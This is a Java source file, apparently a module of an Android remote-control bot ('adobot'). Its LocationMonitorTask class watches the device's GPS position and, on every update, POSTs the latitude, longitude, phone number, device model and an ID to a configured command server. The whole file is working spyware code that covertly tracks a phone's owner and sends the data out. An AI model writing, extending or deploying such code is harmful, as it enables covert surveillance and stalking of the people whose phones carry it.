package com.android.adobot.tasks;

import android.Manifest;
import android.content.Context;
import android.content.pm.PackageManager;
import android.location.Location;
import android.support.v4.app.ActivityCompat;
import android.util.Log;

import com.android.adobot.CommandService;
import com.android.adobot.Constants;
import com.android.adobot.http.Http;

import java.util.HashMap;

import io.nlopez.smartlocation.OnLocationUpdatedListener;
import io.nlopez.smartlocation.SmartLocation;

/**
 * Created by adones on 2/26/17.
 */

public class LocationMonitorTask extends BaseTask {

    private static final String TAG = "LocationMonitorTask";

    private double latitude;
    private double longitude;

    public LocationMonitorTask(CommandService c) {
        setContext(c);
        this.latitude = 0;
        this.longitude = 0;
    }

    @Override
    public void run() {
        super.run();

        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(context, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
            observeLocation();
        }
    }

    private void observeLocation() {
        SmartLocation.with(context).location()
                .start(new OnLocationUpdatedListener() {
                    @Override
                    public void onLocationUpdated(Location location) {
                        updateLocation(location);
                    }
                });
    }

    private void updateLocation(Location location) {
        if (location != null) {
            latitude = location.getLatitude();
            longitude = location.getLongitude();

            Log.i(TAG, "Location changed ....");

            HashMap bot = new HashMap();
            bot.put("uid", commonParams.getUid());
            bot.put("provider", commonParams.getProvider());
            bot.put("lat", latitude);
            bot.put("longi", longitude);
            bot.put("device", commonParams.getDevice());
            bot.put("sdk", commonParams.getSdk());
            bot.put("version", commonParams.getVersion());
            bot.put("phone", commonParams.getPhone());
            Http req = new Http();
            req.setUrl(commonParams.getServer() + Constants.POST_STATUS_URL + "/" + commonParams.getUid());
            req.setMethod("POST");
            req.setParams(bot);
            req.execute();
        }
    }

    public double getLatitude(){
        return this.latitude;
    }

    public double getLongitude() {
        return this.longitude;
    }
}
